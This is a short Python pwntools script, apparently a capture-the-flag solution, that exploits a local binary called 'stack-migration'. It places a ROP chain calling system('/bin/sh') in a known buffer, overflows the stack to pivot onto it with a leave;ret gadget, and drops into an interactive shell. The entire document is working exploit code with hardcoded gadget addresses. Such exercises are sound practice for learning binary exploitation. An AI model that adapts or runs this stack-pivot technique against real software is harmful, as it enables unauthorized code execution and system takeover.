#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./stack-migration')
elf = ELF('./stack-migration')

buf1_addr = 0x602040 
prdi_ret = 0x400743
system_plt = 0x400520
leave_ret = 0x4006d7

p.recvuntil("Enter your data:\n")
payload = p64(prdi_ret) + p64(buf1_addr+0x18) + p64(system_plt) + '/bin/sh\x00'
p.send(payload)

p.recvuntil("Please pwn me :)\n")
payload = 'A'*0x30 + p64(buf1_addr-0x8) + p64(leave_ret)
p.send(payload)
p.interactive()

